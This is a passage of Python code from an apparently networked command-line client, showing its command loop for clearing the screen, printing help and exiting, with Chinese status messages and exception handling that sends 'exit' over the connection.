                    os.system("cls") if os.name == "nt" else os.system("clear")
                elif k_command == "exit":
                    self.connection.send("exit".encode('utf-8'))
                    return 0
                elif splitted_k_command[0] == "help":
                    print(self.help(self.terminal_state, splitted_k_command[1])) if len(splitted_k_command) > 1 else print(self.help(self.terminal_state))                        
                else:
                    print(f"{Fore.RED}[-]未知命令。输入'help'查看命令列表。")
            
            except KeyboardInterrupt:
                print(f"{Fore.CYAN}[!]检测到CTRL+C。正在退出...")
                try:
                    self.connection.send("exit".encode('utf-8'))
                except:
                    pass
                return 0
            except Exception as e:
                print(f"{Fore.RED}[-]执行命令时发生错误: {str(e)}")
                try:
                    self.connection.send("exit".encode('utf-8'))
                except:
                    pass
                return 0
        